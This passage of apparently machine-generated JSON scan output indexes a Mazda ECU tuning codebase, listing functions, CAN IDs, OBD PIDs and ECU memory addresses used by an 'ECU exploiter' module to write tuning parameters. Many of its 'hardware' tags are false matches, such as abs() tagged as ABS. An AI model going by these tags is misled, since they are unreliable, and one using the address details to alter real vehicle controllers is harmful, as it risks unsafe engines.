"line": 31}, {"type": "class", "name": "TuningTarget", "line": 41}, {"type": "class", "name": "ModelMetrics", "line": 63}, {"type": "class", "name": "AITunerError", "line": 84}, {"type": "class", "name": "ModelNotTrainedError", "line": 89}, {"type": "class", "name": "InsufficientDataError", "line": 94}, {"type": "class", "name": "RealTimeAITuner", "line": 99}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 25, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, VehicleState"}, {"type": "hardware", "line": 25, "hardware": "vehicle", "content": "SecurityLevel, SecurityCredentials, VehicleState"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "from secure_database import SecureDatabase"}, {"type": "hardware", "line": 107, "hardware": "vehicle", "content": "\"rpm\", \"vehicle_speed\", \"throttle_position\", \"pedal_position\","}, {"type": "hardware", "line": 133, "hardware": "ECU", "content": "self.current_credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "self.database: Optional[SecureDatabase] = None"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "def set_database(self, database: SecureDatabase) -> None:"}, {"type": "hardware", "line": 182, "hardware": "ECU", "content": "def set_credentials(self, credentials: SecurityCredentials) -> None:"}, {"type": "hardware", "line": 183, "hardware": "ECU", "content": "\"\"\"Set security credentials.\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "real_time_telemetry.py", "lines_read": 755, "features_found": [{"type": "function", "name": "uptime_seconds", "line": 84}, {"type": "function", "name": "can_sample_rate", "line": 89}, {"type": "function", "name": "obd_sample_rate", "line": 96}, {"type": "function", "name": "__init__", "line": 150}, {"type": "function", "name": "set_obd_service", "line": 203}, {"type": "function", "name": "set_can_engine", "line": 208}, {"type": "function", "name": "set_database", "line": 214}, {"type": "function", "name": "set_credentials", "line": 219}, {"type": "function", "name": "_setup_can_handlers", "line": 224}, {"type": "function", "name": "_handle_engine_rpm", "line": 255}, {"type": "function", "name": "_handle_vehicle_speed", "line": 270}, {"type": "function", "name": "_handle_throttle_position", "line": 282}, {"type": "function", "name": "_handle_pedal_position", "line": 294}, {"type": "function", "name": "_handle_boost_pressure", "line": 306}, {"type": "function", "name": "_handle_map_sensor", "line": 320}, {"type": "function", "name": "_handle_maf_flow", "line": 333}, {"type": "function", "name": "_update_telemetry_field", "line": 346}, {"type": "function", "name": "_validate_data_point", "line": 375}, {"type": "function", "name": "_map_obd_pid_to_field", "line": 555}, {"type": "function", "name": "_write_batch_to_database_sync", "line": 618}, {"type": "function", "name": "_save_telemetry_sync", "line": 628}, {"type": "function", "name": "get_latest_telemetry", "line": 685}, {"type": "function", "name": "get_telemetry_history", "line": 689}, {"type": "function", "name": "get_statistics", "line": 693}, {"type": "function", "name": "get_current_state", "line": 697}, {"type": "function", "name": "is_collecting", "line": 701}, {"type": "function", "name": "configure_sampling_rates", "line": 730}, {"type": "function", "name": "reset_statistics", "line": 742}, {"type": "function", "name": "__del__", "line": 747}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "concurrent.futures", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "mazda_obd_service", "line": null}, {"type": "import", "module": "mazda_can_engine", "line": null}, {"type": "import", "module": "secure_database", "line": null}, {"type": "import", "module": "mazda_security_core", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "deque,", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "ThreadPoolExecutor", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "MazdaOBDService,", "line": null}, {"type": "import", "module": "MazdaCANEngine,", "line": null}, {"type": "import", "module": "SecureDatabase", "line": null}, {"type": "import", "module": "MazdaSecurityCore", "line": null}], "components_found": [{"type": "class", "name": "TelemetryState", "line": 28}, {"type": "class", "name": "TelemetryConfig", "line": 38}, {"type": "class", "name": "TelemetryStats", "line": 71}, {"type": "class", "name": "TelemetryError", "line": 103}, {"type": "class", "name": "TelemetryConfigError", "line": 108}, {"type": "class", "name": "RealTimeTelemetry", "line": 113}], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "CAN", "content": "RealTimeTelemetry - Hybrid CAN/OBD telemetry collection system."}, {"type": "protocol", "line": 2, "protocol": "OBD", "content": "RealTimeTelemetry - Hybrid CAN/OBD telemetry collection system."}, {"type": "protocol", "line": 3, "protocol": "CAN", "content": "Collects high-frequency data via CAN events and lower-frequency data via OBD polling."}, {"type": "protocol", "line": 3, "protocol": "OBD", "content": "Collects high-frequency data via CAN events and lower-frequency data via OBD polling."}, {"type": "protocol", "line": 19, "protocol": "CAN", "content": "TelemetryData, CANMessage, OBDPacket, VehicleState,"}, {"type": "protocol", "line": 19, "protocol": "OBD", "content": "TelemetryData, CANMessage, OBDPacket, VehicleState,"}, {"type": "protocol", "line": 22, "protocol": "OBD", "content": "from mazda_obd_service import MazdaOBDService, OBDCommandMode"}, {"type": "protocol", "line": 23, "protocol": "CAN", "content": "from mazda_can_engine import MazdaCANEngine, CANFilter"}, {"type": "protocol", "line": 90, "protocol": "CAN", "content": "\"\"\"Get CAN sample rate.\"\"\""}, {"type": "protocol", "line": 97, "protocol": "OBD", "content": "\"\"\"Get OBD sample rate.\"\"\""}, {"type": "protocol", "line": 115, "protocol": "CAN", "content": "Real-time telemetry collection system with hybrid CAN/OBD approach."}, {"type": "protocol", "line": 115, "protocol": "OBD", "content": "Real-time telemetry collection system with hybrid CAN/OBD approach."}, {"type": "protocol", "line": 120, "protocol": "CAN", "content": "CAN_TELEMETRY_IDS = {"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ENGINE_RPM\": 0x280,"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "\"VEHICLE_SPEED\": 0x281,"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "\"THROTTLE_POSITION\": 0x250,"}, {"type": "protocol", "line": 124, "protocol": "0x[0-9A-Fa-f]+", "content": "\"PEDAL_POSITION\": 0x251,"}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BOOST_PRESSURE\": 0x311,"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "\"MAP_SENSOR\": 0x310,"}, {"type": "protocol", "line": 127, "protocol": "0x[0-9A-Fa-f]+", "content": "\"MAF_FLOW\": 0x290,"}, {"type": "protocol", "line": 128, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WHEEL_SPEED_FL\": 0x1A0,"}, {"type": "protocol", "line": 129, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WHEEL_SPEED_FR\": 0x1A1,"}, {"type": "protocol", "line": 130, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WHEEL_SPEED_RL\": 0x1A2,"}, {"type": "protocol", "line": 131, "protocol": "0x[0-9A-Fa-f]+", "content": "\"WHEEL_SPEED_RR\": 0x1A3,"}, {"type": "protocol", "line": 135, "protocol": "OBD", "content": "OBD_TELEMETRY_PIDS = {"}, {"type": "protocol", "line": 135, "protocol": "PID", "content": "OBD_TELEMETRY_PIDS = {"}, {"type": "protocol", "line": 166, "protocol": "OBD", "content": "self.obd_service: Optional[MazdaOBDService] = None"}, {"type": "protocol", "line": 167, "protocol": "CAN", "content": "self.can_engine: Optional[MazdaCANEngine] = None"}, {"type": "protocol", "line": 176, "protocol": "CAN", "content": "self.can_filters: List[CANFilter] = []"}, {"type": "protocol", "line": 203, "protocol": "OBD", "content": "def set_obd_service(self, obd_service: MazdaOBDService) -> None:"}, {"type": "protocol", "line": 204, "protocol": "OBD", "content": "\"\"\"Set OBD service interface.\"\"\""}, {"type": "protocol", "line": 206, "protocol": "OBD", "content": "self.logger.info(\"OBD service interface set\")"}, {"type": "protocol", "line": 208, "protocol": "CAN", "content": "def set_can_engine(self, can_engine: MazdaCANEngine) -> None:"}, {"type": "protocol", "line": 209, "protocol": "CAN", "content": "\"\"\"Set CAN engine interface.\"\"\""}, {"type": "protocol", "line": 212, "protocol": "CAN", "content": "self.logger.info(\"CAN engine interface set\")"}, {"type": "protocol", "line": 225, "protocol": "CAN", "content": "\"\"\"Set up CAN message handlers for telemetry.\"\"\""}, {"type": "protocol", "line": 231, "protocol": "0x[0-9A-Fa-f]+", "content": "0x280: self._handle_engine_rpm,"}, {"type": "protocol", "line": 232, "protocol": "0x[0-9A-Fa-f]+", "content": "0x281: self._handle_vehicle_speed,"}, {"type": "protocol", "line": 233, "protocol": "0x[0-9A-Fa-f]+", "content": "0x250: self._handle_throttle_position,"}, {"type": "protocol", "line": 234, "protocol": "0x[0-9A-Fa-f]+", "content": "0x251: self._handle_pedal_position,"}, {"type": "protocol", "line": 235, "protocol": "0x[0-9A-Fa-f]+", "content": "0x311: self._handle_boost_pressure,"}, {"type": "protocol", "line": 236, "protocol": "0x[0-9A-Fa-f]+", "content": "0x310: self._handle_map_sensor,"}, {"type": "protocol", "line": 237, "protocol": "0x[0-9A-Fa-f]+", "content": "0x290: self._handle_maf_flow,"}, {"type": "protocol", "line": 245, "protocol": "CAN", "content": "for can_id in self.CAN_TELEMETRY_IDS.values():"}, {"type": "protocol", "line": 246, "protocol": "CAN", "content": "filt = CANFilter("}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "mask=0x7FF,  # Standard 11-bit mask"}, {"type": "protocol", "line": 249, "protocol": "CAN", "content": "description=f\"Telemetry CAN ID 0x{can_id:03X}\""}, {"type": "protocol", "line": 255, "protocol": "CAN", "content": "def _handle_engine_rpm(self, message: CANMessage) -> None:"}, {"type": "protocol", "line": 256, "protocol": "CAN", "content": "\"\"\"Handle engine RPM CAN message.\"\"\""}, {"type": "protocol", "line": 267, "protocol": "CAN", "content": "self.logger.error(f\"Failed to parse RPM CAN message: {e}\")"}, {"type": "protocol", "line": 270, "protocol": "CAN", "content": "def _handle_vehicle_speed(self, message: CANMessage) -> None:"}, {"type": "protocol", "line": 271, "protocol": "CAN", "content": "\"\"\"Handle vehicle speed CAN message.\"\"\""}, {"type": "protocol", "line": 279, "protocol": "CAN", "content": "self.logger.error(f\"Failed to parse vehicle speed CAN message: {e}\")"}, {"type": "protocol", "line": 282, "protocol": "CAN", "content": "def _handle_throttle_position(self, message: CANMessage) -> None:"}, {"type": "protocol", "line": 283, "protocol": "CAN", "content": "\"\"\"Handle throttle position CAN message.\"\"\""}, {"type": "protocol", "line": 291, "protocol": "CAN", "content": "self.logger.error(f\"Failed to parse throttle position CAN message: {e}\")"}, {"type": "protocol", "line": 294, "protocol": "CAN", "content": "def _handle_pedal_position(self, message: CANMessage) -> None:"}, {"type": "protocol", "line": 295, "protocol": "CAN", "content": "\"\"\"Handle accelerator pedal position CAN message.\"\"\""}, {"type": "protocol", "line": 303, "protocol": "CAN", "content": "self.logger.error(f\"Failed to parse pedal position CAN message: {e}\")"}, {"type": "protocol", "line": 306, "protocol": "CAN", "content": "def _handle_boost_pressure(self, message: CANMessage) -> None:"}, {"type": "protocol", "line": 307, "protocol": "CAN", "content": "\"\"\"Handle boost pressure CAN message.\"\"\""}, {"type": "protocol", "line": 317, "protocol": "CAN", "content": "self.logger.error(f\"Failed to parse boost pressure CAN message: {e}\")"}, {"type": "protocol", "line": 320, "protocol": "CAN", "content": "def _handle_map_sensor(self, message: CANMessage) -> None:"}, {"type": "protocol", "line": 321, "protocol": "CAN", "content": "\"\"\"Handle MAP sensor CAN message.\"\"\""}, {"type": "protocol", "line": 330, "protocol": "CAN", "content": "self.logger.error(f\"Failed to parse MAP sensor CAN message: {e}\")"}, {"type": "protocol", "line": 333, "protocol": "CAN", "content": "def _handle_maf_flow(self, message: CANMessage) -> None:"}, {"type": "protocol", "line": 334, "protocol": "CAN", "content": "\"\"\"Handle MAF flow CAN message.\"\"\""}, {"type": "protocol", "line": 343, "protocol": "CAN", "content": "self.logger.error(f\"Failed to parse MAF flow CAN message: {e}\")"}, {"type": "protocol", "line": 423, "protocol": "CAN", "content": "raise TelemetryError(\"OBD service and CAN engine must be set\")"}, {"type": "protocol", "line": 423, "protocol": "OBD", "content": "raise TelemetryError(\"OBD service and CAN engine must be set\")"}, {"type": "protocol", "line": 506, "protocol": "OBD", "content": "\"\"\"OBD data polling loop.\"\"\""}, {"type": "protocol", "line": 520, "protocol": "OBD", "content": "self.logger.error(f\"OBD polling loop error: {e}\")"}, {"type": "protocol", "line": 525, "protocol": "OBD", "content": "\"\"\"Poll OBD data for lower-frequency parameters.\"\"\""}, {"type": "protocol", "line": 528, "protocol": "OBD", "content": "for param_name, pid in self.OBD_TELEMETRY_PIDS.items():"}, {"type": "protocol", "line": 528, "protocol": "PID", "content": "for param_name, pid in self.OBD_TELEMETRY_PIDS.items():"}, {"type": "protocol", "line": 545, "protocol": "OBD", "content": "self.logger.warning(f\"Failed to read OBD PID {pid}: {e}\")"}, {"type": "protocol", "line": 545, "protocol": "PID", "content": "self.logger.warning(f\"Failed to read OBD PID {pid}: {e}\")"}, {"type": "protocol", "line": 552, "protocol": "OBD", "content": "self.logger.error(f\"OBD polling error: {e}\")"}, {"type": "protocol", "line": 556, "protocol": "OBD", "content": "\"\"\"Map OBD PID name to telemetry field.\"\"\""}, {"type": "protocol", "line": 556, "protocol": "PID", "content": "\"\"\"Map OBD PID name to telemetry field.\"\"\""}], "hardware_assumptions": [{"type": "hardware", "line": 16, "hardware": "ECU", "content": "from concurrent.futures import ThreadPoolExecutor"}, {"type": "hardware", "line": 19, "hardware": "vehicle", "content": "TelemetryData, CANMessage, OBDPacket, VehicleState,"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, LogEntry"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "from secure_database import SecureDatabase"}, {"type": "hardware", "line": 25, "hardware": "ECU", "content": "from mazda_security_core import MazdaSecurityCore"}, {"type": "hardware", "line": 122, "hardware": "vehicle", "content": "\"VEHICLE_SPEED\": 0x281,"}, {"type": "hardware", "line": 163, "hardware": "ECU", "content": "self.current_credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 168, "hardware": "ECU", "content": "self.database: Optional[SecureDatabase] = None"}, {"type": "hardware", "line": 188, "hardware": "ABS", "content": "self._main_event_loop: Optional[asyncio.AbstractEventLoop] = None"}, {"type": "hardware", "line": 196, "hardware": "ECU", "content": "self.db_executor = ThreadPoolExecutor(max_workers=2, thread_name_prefix=\"telemetry_db\")"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "def set_database(self, database: SecureDatabase) -> None:"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "def set_credentials(self, credentials: SecurityCredentials) -> None:"}, {"type": "hardware", "line": 220, "hardware": "ECU", "content": "\"\"\"Set security credentials.\"\"\""}, {"type": "hardware", "line": 232, "hardware": "vehicle", "content": "0x281: self._handle_vehicle_speed,"}, {"type": "hardware", "line": 270, "hardware": "vehicle", "content": "def _handle_vehicle_speed(self, message: CANMessage) -> None:"}, {"type": "hardware", "line": 271, "hardware": "vehicle", "content": "\"\"\"Handle vehicle speed CAN message.\"\"\""}, {"type": "hardware", "line": 275, "hardware": "vehicle", "content": "self._update_telemetry_field(\"vehicle_speed\", speed)"}, {"type": "hardware", "line": 279, "hardware": "vehicle", "content": "self.logger.error(f\"Failed to parse vehicle speed CAN message: {e}\")"}, {"type": "hardware", "line": 395, "hardware": "ABS", "content": "z_score = abs(value - mean) / std_dev"}, {"type": "hardware", "line": 606, "hardware": "ECU", "content": "await asyncio.get_event_loop().run_in_executor("}, {"type": "hardware", "line": 607, "hardware": "ECU", "content": "self.db_executor,"}, {"type": "hardware", "line": 751, "hardware": "ECU", "content": "if hasattr(self, 'db_executor'):"}, {"type": "hardware", "line": 752, "hardware": "ECU", "content": "self.db_executor.shutdown(wait=False)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "real_time_tuning_session.py", "lines_read": 886, "features_found": [{"type": "function", "name": "__bool__", "line": 80}, {"type": "function", "name": "to_dict", "line": 93}, {"type": "function", "name": "__init__", "line": 134}, {"type": "function", "name": "set_telemetry", "line": 177}, {"type": "function", "name": "set_ai_tuner", "line": 182}, {"type": "function", "name": "set_ecu_exploiter", "line": 187}, {"type": "function", "name": "set_database", "line": 192}, {"type": "function", "name": "set_credentials", "line": 197}, {"type": "function", "name": "_estimate_current_power", "line": 589}, {"type": "function", "name": "_estimate_current_torque", "line": 601}, {"type": "function", "name": "_estimate_current_efficiency", "line": 611}, {"type": "function", "name": "_validate_parameters", "line": 621}, {"type": "function", "name": "_perform_safety_checks", "line": 651}, {"type": "function", "name": "_get_parameter_address", "line": 721}, {"type": "function", "name": "_parameter_to_bytes", "line": 731}, {"type": "function", "name": "_check_telemetry_safety", "line": 759}, {"type": "function", "name": "_verify_changes", "line": 774}, {"type": "function", "name": "_calculate_performance_gains", "line": 794}, {"type": "function", "name": "get_session_status", "line": 869}, {"type": "function", "name": "__del__", "line": 882}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "real_time_telemetry", "line": null}, {"type": "import", "module": "real_time_ai_tuner", "line": null}, {"type": "import", "module": "mazda_ecu_exploiter", "line": null}, {"type": "import", "module": "secure_database", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "RealTimeTelemetry", "line": null}, {"type": "import", "module": "RealTimeAITuner,", "line": null}, {"type": "import", "module": "MazdaECUExploiter", "line": null}, {"type": "import", "module": "SecureDatabase", "line": null}], "components_found": [{"type": "class", "name": "SessionPhase", "line": 28}, {"type": "class", "name": "SessionState", "line": 41}, {"type": "class", "name": "SessionConfig", "line": 50}, {"type": "class", "name": "PhaseResult", "line": 71}, {"type": "class", "name": "RollbackData", "line": 86}, {"type": "class", "name": "TuningSessionError", "line": 103}, {"type": "class", "name": "SessionPhaseError", "line": 108}, {"type": "class", "name": "RollbackFailedError", "line": 113}, {"type": "class", "name": "RealTimeTuningSession", "line": 118}], "algorithms": [{"type": "algorithm_function", "line": 794, "content": "def _calculate_performance_gains(self, verification_data: List[TelemetryData]) -> Dict[str, float]:"}], "protocols": [{"type": "protocol", "line": 725, "protocol": "0x[0-9A-Fa-f]+", "content": "\"fuel_base\": 0x020000,"}, {"type": "protocol", "line": 726, "protocol": "0x[0-9A-Fa-f]+", "content": "\"timing_advance\": 0x022000,"}, {"type": "protocol", "line": 727, "protocol": "0x[0-9A-Fa-f]+", "content": "\"boost_target\": 0x024000,"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "Coordinates AI tuners, telemetry, ECU exploiters, and database through phases:"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, FlashOperation, FlashState,"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "VehicleState, ECUState"}, {"type": "hardware", "line": 20, "hardware": "vehicle", "content": "VehicleState, ECUState"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "from mazda_ecu_exploiter import MazdaECUExploiter"}, {"type": "hardware", "line": 25, "hardware": "ECU", "content": "from secure_database import SecureDatabase"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "\"\"\"Phase execution error.\"\"\""}, {"type": "hardware", "line": 126, "hardware": "ECU", "content": "SessionPhase.ANALYZE: \"_execute_analyze_phase\","}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "SessionPhase.PLAN: \"_execute_plan_phase\","}, {"type": "hardware", "line": 128, "hardware": "ECU", "content": "SessionPhase.VALIDATE: \"_execute_validate_phase\","}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "SessionPhase.APPLY: \"_execute_apply_phase\","}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "SessionPhase.VERIFY: \"_execute_verify_phase\","}, {"type": "hardware", "line": 131, "hardware": "ECU", "content": "SessionPhase.ROLLBACK: \"_execute_rollback_phase\","}, {"type": "hardware", "line": 155, "hardware": "ECU", "content": "self.ecu_exploiter: Optional[MazdaECUExploiter] = None"}, {"type": "hardware", "line": 156, "hardware": "ECU", "content": "self.database: Optional[SecureDatabase] = None"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "self.current_credentials: Optional[SecurityCredentials] = None"}, {"type": "hardware", "line": 187, "hardware": "ECU", "content": "def set_ecu_exploiter(self, ecu_exploiter: MazdaECUExploiter) -> None:"}, {"type": "hardware", "line": 188, "hardware": "ECU", "content": "\"\"\"Set ECU exploiter interface.\"\"\""}, {"type": "hardware", "line": 189, "hardware": "ECU", "content": "self.ecu_exploiter = ecu_exploiter"}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "self.logger.info(\"ECU exploiter interface set\")"}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "def set_database(self, database: SecureDatabase) -> None:"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "def set_credentials(self, credentials: SecurityCredentials) -> None:"}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "\"\"\"Set security credentials.\"\"\""}, {"type": "hardware", "line": 218, "hardware": "ECU", "content": "if not all([self.telemetry, self.ai_tuner, self.ecu_exploiter, self.database]):"}, {"type": "hardware", "line": 223, "hardware": "ECU", "content": "raise TuningSessionError(\"Security credentials required\")"}, {"type": "hardware", "line": 250, "hardware": "ECU", "content": "async def execute_phase(self, phase: SessionPhase) -> PhaseResult:"}, {"type": "hardware", "line": 252, "hardware": "ECU", "content": "Execute a specific session phase."}, {"type": "hardware", "line": 255, "hardware": "ECU", "content": "phase: Phase to execute"}, {"type": "hardware", "line": 258, "hardware": "ECU", "content": "Phase execution result"}, {"type": "hardware", "line": 261, "hardware": "ECU", "content": "raise TuningSessionError(f\"Cannot execute phase {phase.value}, session not active\")"}, {"type": "hardware", "line": 339, "hardware": "ECU", "content": "async def _execute_analyze_phase(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 340, "hardware": "vehicle", "content": "\"\"\"Analyze current vehicle state and tuning.\"\"\""}, {"type": "hardware", "line": 345, "hardware": "ECU", "content": "ecu_status = self.ecu_exploiter.get_ecu_status()"}, {"type": "hardware", "line": 350, "hardware": "ECU", "content": "\"ecu_status\": ecu_status,"}, {"type": "hardware", "line": 367, "hardware": "ECU", "content": "async def _execute_plan_phase(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 391, "hardware": "ECU", "content": "async def _execute_validate_phase(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 408, "hardware": "ECU", "content": "async def _execute_apply_phase(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 409, "hardware": "ECU", "content": "\"\"\"Apply the optimized parameters to the ECU.\"\"\""}, {"type": "hardware", "line": 425, "hardware": "ECU", "content": "apply_result = await self._apply_parameters_to_ecu(self.optimized_parameters)"}, {"type": "hardware", "line": 439, "hardware": "ECU", "content": "async def _execute_verify_phase(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 462, "hardware": "ECU", "content": "async def _execute_rollback_phase(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 518, "hardware": "ECU", "content": "result = await self.execute_phase(phase)"}, {"type": "hardware", "line": 539, "hardware": "ECU", "content": "self.logger.error(f\"Session execution failed: {e}\")"}, {"type": "hardware", "line": 541, "hardware": "ECU", "content": "raise TuningSessionError(f\"Session execution failed: {e}\")"}, {"type": "hardware", "line": 617, "hardware": "ABS", "content": "efficiency = 100 - abs(afr - 14.7) * 2"}, {"type": "hardware", "line": 664, "hardware": "ECU", "content": "\"\"\"Create ECU backup before applying changes.\"\"\""}, {"type": "hardware", "line": 666, "hardware": "ECU", "content": "backup_result = await self.ecu_exploiter.backup_ecu()"}, {"type": "hardware", "line": 688, "hardware": "ECU", "content": "async def _apply_parameters_to_ecu(self, parameters: Dict[str, float]) -> PhaseResult:"}, {"type": "hardware", "line": 689, "hardware": "ECU", "content": "\"\"\"Apply parameters to ECU.\"\"\""}, {"type": "hardware", "line": 700, "hardware": "ECU", "content": "write_result = await self.ecu_exploiter.write_memory(address, data)"}, {"type": "hardware", "line": 722, "hardware": "ECU", "content": "\"\"\"Get ECU memory address for parameter.\"\"\""}, {"type": "hardware", "line": 732, "hardware": "ECU", "content": "\"\"\"Convert parameter value to bytes for ECU write.\"\"\""}, {"type": "hardware", "line": 816, "hardware": "ECU", "content": "rollback_result = await self.execute_phase(SessionPhase.ROLLBACK)"}, {"type": "hardware", "line": 826, "hardware": "ECU", "content": "return await self._apply_parameters_to_ecu(original_parameters)"}, {"type": "hardware", "line": 834, "hardware": "ABS", "content": "power_diff = abs(current_power - self.performance_metrics[\"baseline_power\"])"}], "security_logic": [{"type": "security_pattern", "line": 711, "pattern": "key", "content": "data={\"parameters_applied\": list(parameters.keys())}"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "requirements.txt", "lines_read": 39, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "run_muts.py", "lines_read": 48, "features_found": [{"type": "function", "name": "main", "line": 25}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "gui.main_window", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "main", "line": null}, {"type": "import", "module": "required", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 13, "hardware": "ABS", "content": "project_root = Path(__file__).parent.absolute()"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "safety_limits.yml", "lines_read": 14, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "secure_database.py", "lines_read": 974, "features_found": [{"type": "function", "name": "__init__", "line": 197}, {"type": "function", "name": "_initialize_database", "line": 228}, {"type": "function", "name": "_get_connection", "line": 255}, {"type": "function", "name": "_encrypt_data", "line": 276}, {"type": "function", "name": "_decrypt_data", "line": 298}, {"type": "function", "name": "_calculate_profile_checksum", "line": 901}, {"type": "function", "name": "get_database_stats", "line": 931}, {"type": "function", "name": "close", "line": 954}, {"type": "function", "name": "__del__", "line": 968}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "contextlib", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "mazda_security_core", "line": null}, {"type": "import", "module": "sqlite3", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "asynccontextmanager,", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "MazdaSecurityCore", "line": null}], "components_found": [{"type": "class", "name": "DatabaseError", "line": 26}, {"type": "class", "name": "DatabaseConnectionError", "line": 31}, {"type": "class", "name": "DatabaseSecurityError", "line": 36}, {"type": "class", "name": "DatabaseConfig", "line": 42}, {"type": "class", "name": "SecureDatabase", "line": 58}], "algorithms": [{"type": "algorithm_function", "line": 901, "content": "def _calculate_profile_checksum(self, profile: TuningProfile) -> str:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "SecureDatabase - SQLite-based persistence layer with SecurityCore integration."}, {"type": "hardware", "line": 3, "hardware": "ECU", "content": "Provides secure storage for tuning profiles, telemetry data, user credentials,"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, LogEntry, TelemetryData,"}, {"type": "hardware", "line": 21, "hardware": "vehicle", "content": "VehicleState, TuningMode"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "from mazda_security_core import MazdaSecurityCore"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "class DatabaseSecurityError(DatabaseError):"}, {"type": "hardware", "line": 37, "hardware": "ECU", "content": "\"\"\"Database security errors.\"\"\""}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "class SecureDatabase:"}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "Secure SQLite database with encryption integration."}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "security_level INTEGER NOT NULL,"}, {"type": "hardware", "line": 158, "hardware": "vehicle", "content": "\"vehicle_info\": \"\"\""}, {"type": "hardware", "line": 159, "hardware": "vehicle", "content": "CREATE TABLE IF NOT 